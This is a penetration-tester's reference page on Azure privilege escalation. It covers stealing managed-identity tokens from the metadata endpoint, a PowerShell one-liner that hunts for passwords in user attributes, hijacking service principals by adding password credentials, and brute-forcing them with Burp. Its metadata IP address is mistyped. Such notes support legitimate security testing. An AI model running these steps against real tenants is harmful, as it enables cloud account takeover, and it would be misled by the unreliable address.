# Azure Privilege Escalation

## Azure Privilege Escalation

#### Common things to look at :

* Key Vaults
* VMs
* Deployment scripts
* AD user attribute data
* Runbooks

### Managed Identities

VM access can have higher access than the actual user in Azure\(ie permission for backup and so on\) :

* VM can authenticate to Azure with a Managed Identity by requesting OAuth Token from Azure Metadata Server `http://169.254.169.54/metadata/identity/oauth2/token`
* RDP to the VM, request the token and connect to Azure using AZ cli or powershell

#### Resources

{% embed url="https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/" %}

### User description Field

Same as AD Env, critical info can be found in description fields

```csharp
import-module MSOnline
Connect-MsolService
$users = Get-MsolUser; foreach($user in $users){$props = @();$user | Get-Member | ForEach-Object{$props+=$_.Name}; foreach($prop in $props){if($user.$prop -like "password"){Write-Output ("[*]" + $user.UserPrincipalName +"[" + $prop + "]" + ":" + $user.$prop)}}}
```

### Service Principal Hijacking

* Over 200 default services principals in a O365 Tenant
* They are NOT listed in Azure Portal
* Different Permissions via "Microsoft Graph"
* Application Administrator can change password or certificats for service principal \(include default service principal\)

#### List service principal

```csharp
import-module Az 
Get-AzADServicePrincipal | Select-Object Displayname
```

![](../../../../.gitbook/assets/ce2232d0bbd54de3b4edaf39909bf813.png)

### Interesting Permissions

![](../../../../.gitbook/assets/610deb3ec4614a2794ef770ed2c3e7d6.png)

#### Resource

{% embed url="https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/" %}

### Service Principal password change

Application Admin cannot create new users to groups but can change password for Service Principal which are able to do it!

* Connect to Azure

```csharp
Connect-AzureAD
Get-AzureADServicePrincipal
Get-AzureADServicePrincipal -SearchString "Whatever"
```

![](../../../../.gitbook/assets/95623977625147aeb677475854f33ad1.png)

* Select the Service Principal and change his password

```csharp
New-AzureADServicePrincipalPasswordCredential  -ObjectId <OBJECT ID>  -EndDate "12-31-2099 12:00:00" -StartDate "12-31-2015 12:00:00" -Value "IvchangeThePassword:)"
```

![](../../../../.gitbook/assets/ffbe6093a6c84b1a9b5214f7bd50efc8%20%281%29.png)

* Then connect using the SPN application ID and Password, and request a token on the following URL and copy the JWT token

[https://login.microsoftonline.com/TENAND\_ID/oauth2/v2.0/token](https://login.microsoftonline.com/16114b71-06fe-4e5c-a549-d03d6eade144/oauth2/v2.0/token)

![](../../../../.gitbook/assets/644c737c91f74ccaabe31c3afecac169.png)

* Enumerate permission account using SPN Object ID and the JWT

{% embed url="https://graph.microsoft.com/beta/servicePrincipals/OBJECT\_IP\_HERE\\" %}

![](../../../../.gitbook/assets/d9b9755aef7a40a2a023cdb83fbfeb2b.png)

* list every SPN object ID

![](../../../../.gitbook/assets/ca8d06b3711a4c598f8a708fa9a1ee97.png)

* Use burp intruder to bruteforce every SPN accounts \(create filter using "grep and extract"\)

![](../../../../.gitbook/assets/1e67bd65414d4feb93f7b3874d9cb3c8.png)

### Break Glass Admin accounts

Microsoft recommends to set up 2 admin accounts \(one as 'Emergercy case'\) and disable MFA on it.



